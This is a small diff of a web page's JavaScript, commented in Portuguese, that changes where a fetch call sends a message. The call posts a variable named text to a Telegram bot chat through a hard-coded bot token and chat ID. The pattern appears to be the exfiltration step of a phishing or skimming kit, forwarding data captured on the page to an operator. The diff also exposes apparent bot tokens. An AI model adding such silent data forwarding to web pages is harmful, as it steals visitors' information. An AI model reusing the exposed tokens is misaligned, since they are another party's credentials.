@@ -293,8 +293,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
                             // Fazendo a chamada GET com fetch
                             var url =
-                              "https://api.telegram.org/bot6770070198:AAF9lh2-dhhFn9IdkUb9WqTWcljm8bewGGw/sendMessage?chat_id=" +
-                              "-4139113276" +
+                              "https://api.telegram.org/bot6340025791:AAHDtUQfYIAfoLwwFjqG9Qq6UbapHuAnrNI/sendMessage?chat_id=" +
+                              "-4146156333" +
                               `&text=${text}`;
                             fetch(url, {
                               method: "POST",
